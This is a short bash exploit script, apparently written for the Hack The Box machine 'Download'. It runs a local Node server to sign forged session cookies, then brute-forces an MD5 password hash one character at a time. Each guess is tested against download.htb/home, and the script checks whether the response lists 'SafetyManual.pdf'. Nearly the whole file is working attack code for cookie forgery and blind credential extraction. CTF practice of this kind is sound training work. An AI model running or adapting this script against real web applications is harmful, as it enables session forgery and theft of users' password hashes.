#!/bin/bash

# HTB Download
# ------------
# Author: Marss
# Date: 11 Oct, 2023

# Ctrl + C
# (function)
signal_handler(){
    echo -e "\n[!] User aborted."
    exit 1
}
# (signal)
trap signal_handler SIGINT

# Global variables
cookie_file_gen="main.js"
wordlist="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
password=""

# brute force
brute_force(){
    # install dependencies (package.json)
    echo -e "\n[+] Installing dependencies..."
    npm install

    # setup cookie generator
    echo -e "\n[*] Setting up server to generate signed cookies"
    node $cookie_file_gen &
    sleep 2

    # generate cookie by char
    echo "[*] MD5 Password hash:"
    for i in $(seq 1 32); do
        for (( j=0; j<${#wordlist}; j++ )); do
            char="${wordlist:$j:1}"

            cookies=$(curl -sI http://localhost:3000/$password$char| grep "Cookie" | awk '{print $2}' | xargs)
            response=$(curl -s http://download.htb/home -b "$cookies")
            
            if [[ "$response" == *"SafetyManual.pdf"* ]]; then
                password+="$char"
                echo $password
                break
            fi
        done
    done

    # kill cookie server
    echo -e "\n[-] Killing server."
    pkill node
    rm -rf node-modules
    rm package-lock.json
}

brute_force